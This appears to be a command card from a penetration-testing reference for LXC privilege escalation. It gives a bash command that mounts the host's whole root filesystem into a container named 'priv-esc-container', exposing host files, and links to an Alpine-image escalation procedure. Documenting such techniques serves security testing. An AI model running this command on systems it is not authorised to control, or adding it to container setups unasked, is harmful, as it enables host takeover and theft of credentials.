---
type: command
executor: bash
data: >-
  lxc config device add priv-esc-container root-mount disk source=/
  path=/mnt/root recursive=true
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - lxc
  - mount
verified: true
validated: true
---

# Add-Disk-Device-to-Container

## Command

```bash
lxc config device add priv-esc-container root-mount disk source=/ path=/mnt/root recursive=true
```

## Description

Adds a disk device to an LXC container, mounting the host's root filesystem recursively to expose host files inside the container.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| priv-esc-container | Container name | Yes |
| root-mount | Device name | Yes |
| disk | Device type | Yes |
| source=/ | Host path to mount | Yes |
| path=/mnt/root | Container mount path | Yes |
| recursive=true | Enable recursive mount | Yes |

## Examples

### Basic Usage

```bash
lxc config device add mycont host-root disk source=/ path=/host recursive=true
```

## Expected Output

Device root-mount added to priv-esc-container

## Related

- [[procedures/Linux-Privilege-Escalation-via-LXC-LXD-Alpine-Image]]
